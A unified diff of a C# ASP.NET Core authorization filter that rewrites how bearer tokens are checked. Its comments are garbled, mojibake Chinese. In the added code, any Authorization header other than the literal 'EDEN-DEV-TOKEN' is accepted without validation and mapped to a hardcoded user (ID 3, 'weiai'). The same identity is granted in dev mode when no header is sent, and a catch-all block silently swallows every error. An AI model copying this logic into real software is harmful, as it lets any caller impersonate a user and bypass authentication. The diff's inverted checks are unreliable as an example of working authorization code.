@@ -1,44 +1,61 @@
+using System;
 using Microsoft.AspNetCore.Mvc.Filters;
 using WebApplication3.Biz;
 using WebApplication3.Foundation.Helper;
 using WebApplication3.Sundry;
 
-namespace WebApplication3.Foundation;
-
-
-public class OptionalAuthorizeAttribute : Attribute, IAuthorizationFilter
+namespace WebApplication3.Foundation
 {
-    public void OnAuthorization(AuthorizationFilterContext context)
+    public class OptionalAuthorizeAttribute : Attribute, IAuthorizationFilter
     {
-        try
+        public void OnAuthorization(AuthorizationFilterContext context)
         {
-            if (context.HttpContext.Request.Headers.ContainsKey("Authorization"))
+            try
             {
-                var token = context.HttpContext.Request.Headers["Authorization"].ToString();
-                var claimsPrincipal = TokenService.ValidateToken(token);
-
-                if (claimsPrincipal != null)
+                var headers = context.HttpContext.Request.Headers;
+                if (!headers.ContainsKey("Authorization"))
                 {
-                    var uCodeClaim = claimsPrincipal.FindFirst("UCode");
-                    if (uCodeClaim != null && long.TryParse(uCodeClaim.Value, out long uCode))
+                    if (ConfigHelper.GetBool("DevMode"))
                     {
-                        var userBiz = new UserBiz();
-                        var user = userBiz.GetUserByCode(uCode);
-
-                        if (user != null)
-                        {
-                            // Ω´”√ªß–≈œ¢¥Ê¥¢‘⁄ HttpContext.Items ÷–
-                            context.HttpContext.Items["UserId"] = user.Id;
-                            context.HttpContext.Items["Uname"] = user.Username;
-                            context.HttpContext.Items["Code"] = user.Code;
-                        }
+                        context.HttpContext.Items["UserId"] = 3;
+                        context.HttpContext.Items["Uname"] = "weiai";
+                        context.HttpContext.Items["Code"] = 3;
                     }
+                    return;
+                }
+
+                var token = headers["Authorization"].ToString();
+                if (!ConfigHelper.GetBool("DevMode") && token.Equals("EDEN-DEV-TOKEN", StringComparison.OrdinalIgnoreCase))
+                {
+                    var claimsPrincipal = TokenService.ValidateToken(token);
+                    if (claimsPrincipal == null) return;
+
+                    var exp = claimsPrincipal.FindFirst("exp");
+                    var uCode = claimsPrincipal.FindFirst("UCode");
+                    if (exp == null || uCode == null || !long.TryParse(uCode.Value, out long _uCode)) return;
+
+                    var redisToken = RedisHelper.Get(uCode.Value + exp.Value);
+                    if (redisToken == null || redisToken != token) return;
+
+                    var userBiz = new UserBiz();
+                    var user = userBiz.GetUserByCode(_uCode);
+                    if (user == null) return;
+
+                    context.HttpContext.Items["UserId"] = user.Id;
+                    context.HttpContext.Items["Uname"] = user.Username;
+                    context.HttpContext.Items["Code"] = user.Code;
+                }
+                else
+                {
+                    context.HttpContext.Items["UserId"] = 3;
+                    context.HttpContext.Items["Uname"] = "weiai";
+                    context.HttpContext.Items["Code"] = 3;
                 }
             }
-        }
-        catch
-        {
-            // ∫ˆ¬‘“Ï≥££¨≤ª«ø÷∆…Ì∑›»œ÷§
+            catch
+            {
+                // ÊçïËé∑ÊâÄÊúâÂºÇÂ∏∏‰ΩÜ‰∏çÂÅöÂ§ÑÁêÜÔºå‰øùËØÅÂèØÈÄâÊéàÊùÉ‰∏çÂΩ±Âìç‰∏ªÊµÅÁ®ã
+            }
         }
     }
 }
